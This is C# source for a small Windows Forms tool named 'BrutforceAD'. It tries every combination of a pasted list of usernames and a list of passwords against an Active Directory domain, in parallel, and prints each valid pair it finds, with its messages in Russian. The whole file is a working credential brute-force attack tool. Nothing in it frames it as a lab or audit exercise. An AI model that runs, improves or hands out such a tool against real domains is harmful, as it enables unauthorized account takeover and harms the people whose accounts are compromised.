using System;
using System.DirectoryServices.AccountManagement;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Diagnostics;

namespace BrutforceAD
{
    public partial class mainForm : Form
    {
        // Укажите имя полное имя домена
        private string AD_fullname = "";
        private string report = string.Empty;


        public mainForm()
        {
            InitializeComponent();
        }

        private void btn_start_brutforce_Click(object sender, EventArgs e)
        {
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();
            try
            {
                string[] logins = txb_logins.Text.Split(new String[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);
                string[] passwords = txb_passwords.Text.Split(new String[] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries);

                using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, AD_fullname))
                {
                    Parallel.ForEach(logins, login =>
                {
                    bool isValidPassword = false;
                    Parallel.ForEach(passwords, password =>
                    {
                        if (!isValidPassword)
                        {
                            isValidPassword = pc.ValidateCredentials(login.Trim(), password.Trim());
                            if (isValidPassword)
                            {
                                report += String.Format("Найден пароль для пользователя {0}. Пароль: {1}", login.Trim(), password.Trim()) + Environment.NewLine;
                            }
                        }
                    });
                });
                }
                txb_report.Text = report;
                stopwatch.Stop();
                TimeSpan ts = stopwatch.Elapsed;
                string elapsedTime = String.Format("{0:00}:{1:00}:{2:00}.{3:00}",
                    ts.Hours, ts.Minutes, ts.Seconds,
                    ts.Milliseconds / 10);
                MessageBox.Show(String.Format("Выполнено.\nЗатрачено времени: {0}", elapsedTime));
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        private void btn_report_clean_Click(object sender, EventArgs e)
        {
            txb_report.Clear();
            report = string.Empty;
        }
    }
}
